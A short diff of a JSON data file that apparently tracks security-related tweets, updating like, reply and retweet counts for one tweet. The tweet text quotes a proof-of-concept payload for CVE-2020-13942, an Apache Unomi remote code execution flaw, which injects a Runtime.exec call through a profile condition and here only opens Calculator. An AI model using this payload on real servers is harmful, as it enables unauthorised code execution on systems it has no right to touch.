@@ -173,10 +173,10 @@
     "username": "wugeej"
 }
 {
-    "tweetfavorites": 472,
+    "tweetfavorites": 468,
     "tweetquotes": 7,
-    "tweetreplies": 13,
-    "tweetretweets": 165,
+    "tweetreplies": 12,
+    "tweetretweets": 163,
     "tweettext": "#CVE-2020-13942 Apache Unomi Remote Code Execution\n\nPoC:\n{\"filters\":[{\"id\" : \"pyn3rd\",\"filters\": [{\"condition\": {\"parameterValues\": {\"pyn3rd\": \"script::Runtime.getRuntime().exec('open -a Calculator')\"},\"type\":\"profilePropertyCondition\"}}]}],\"sessionId\": \"pyn3rd\"} https://t.co/Gcw5FcZiNp",
     "tweettime": "2020-11-18, 04:38:42",
     "tweeturl": "https://twitter.com/pyn3rd/status/1328920545442680837",
